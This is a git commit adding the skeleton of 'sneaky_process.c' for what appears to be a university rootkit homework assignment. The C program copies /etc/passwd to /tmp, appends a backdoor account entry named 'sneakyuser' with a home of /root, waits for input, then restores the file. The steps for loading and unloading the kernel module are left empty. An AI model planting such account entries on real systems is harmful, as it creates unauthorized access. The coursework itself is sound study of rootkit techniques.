bad0a800a617674c7e7c514ef5b557f2dd3a7943
Anran Chen <achen971005@gmail.com>
2022-04-09 14:07:33 -0400

    feature update: added vscode config, added sneaky_process skeleton

---
+++ homework5_rootkit/sneaky_process.c
@@ -0,0 +1,28 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void){
+  // 1. print process ID
+  printf("sneaky_process pid = %d\n", getpid());
+
+  // 2. copy /etc/passwd to tmp/passwd and print new line
+  system("cp /etc/passwd /tmp");
+  system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n\' >> /etc/passwd");
+
+  // 3. load sneaky module
+  
+
+  // 4. while loop
+  int inputChar;
+  while ((inputChar = getchar()) != 'q');
+
+  // 5. unload sneaky module
+  // system("rmmod sneaky_mod");
+
+  // 6. resore password file
+  system("cp /tmp/passwd /etc");
+  system("rm -rf /tmp/passwd");
+
+  exit(EXIT_SUCCESS);
+}
